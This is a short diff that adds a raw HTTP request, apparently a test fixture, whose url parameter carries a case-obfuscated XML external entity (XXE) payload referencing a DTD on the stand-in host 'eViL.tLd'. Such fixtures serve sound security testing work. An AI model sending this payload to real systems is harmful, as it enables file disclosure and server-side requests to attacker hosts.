@@ -1,0 +1,4 @@
+GET /a?url=<!dOcTyPe%20R%20sYsTeM%20"hTtP://eViL.tLd/EvIl.DtD"> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
